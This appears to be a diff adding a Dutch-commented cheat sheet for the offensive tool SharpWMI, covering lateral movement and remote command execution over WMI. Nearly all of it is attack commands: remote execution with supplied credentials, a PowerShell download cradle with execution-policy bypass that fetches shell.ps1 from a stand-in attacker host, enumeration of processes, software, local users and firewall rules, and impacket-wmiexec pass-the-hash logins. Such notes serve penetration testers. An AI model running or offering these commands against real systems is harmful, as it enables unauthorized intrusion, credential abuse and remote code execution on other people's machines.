@@ -1,0 +1,48 @@
+# SharpWMI — WMI lateral movement en commando uitvoering (C#)
+# Voert remote commando's uit via Windows Management Instrumentation (WMI)
+#
+# === Syntax ===
+# SharpWMI.exe action=ACTION computername=TARGET [opties]
+#
+# === Acties ===
+# exec         Voer een commando uit op remote systeem
+# query        Voer een WMI query uit
+# firewall     Enumereer firewall regels
+#
+# === Belangrijkste opties ===
+# computername=   Doelwit hostname of IP
+# command=        Commando om uit te voeren (bij action=exec)
+# query=          WMI query string (bij action=query)
+# username=       Alternatieve credentials (DOMAIN\USER)
+# password=       Wachtwoord
+# namespace=      WMI namespace (default: root\cimv2)
+#
+# === Voorbeelden ===
+
+# Commando uitvoeren op remote systeem
+SharpWMI.exe action=exec computername=TARGET command="cmd /c whoami"
+
+# Met expliciete credentials
+SharpWMI.exe action=exec computername=TARGET command="cmd /c ipconfig /all" username=DOMAIN\USER password=PASS
+
+# PowerShell download cradle via WMI
+SharpWMI.exe action=exec computername=TARGET command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# WMI query — draaiende processen
+SharpWMI.exe action=query computername=TARGET query="SELECT Name,ProcessId FROM Win32_Process"
+
+# WMI query — geinstalleerde software
+SharpWMI.exe action=query computername=TARGET query="SELECT Name,Version FROM Win32_Product"
+
+# WMI query — lokale gebruikers
+SharpWMI.exe action=query computername=TARGET query="SELECT * FROM Win32_UserAccount WHERE LocalAccount=True"
+
+# Firewall regels enumereren
+SharpWMI.exe action=firewall computername=TARGET
+
+# Impacket variant (pass-the-hash)
+impacket-wmiexec DOMAIN/USER:PASS@TARGET
+impacket-wmiexec -hashes :NTHASH DOMAIN/USER@TARGET
+
+# Noot: WMI gebruikt DCOM (TCP 135 + dynamische poorten)
+# Noot: Output van exec is niet zichtbaar — gebruik redirectie naar bestand
